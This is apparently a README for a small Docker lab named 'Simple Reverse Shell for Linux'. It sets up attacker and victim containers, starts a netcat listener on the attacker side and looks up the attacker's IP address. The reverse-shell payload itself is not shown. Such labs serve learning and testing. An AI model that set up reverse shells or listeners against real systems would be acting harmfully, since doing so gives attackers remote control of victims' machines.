# SRSFL
Simple Reverse Shell for Linux
```console
docker-compose up --build
docker exec -it attacker_container /bin/bash
    - nc -lvp 1234
docker exec -it victim_container /bin/bash
docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' attacker_container
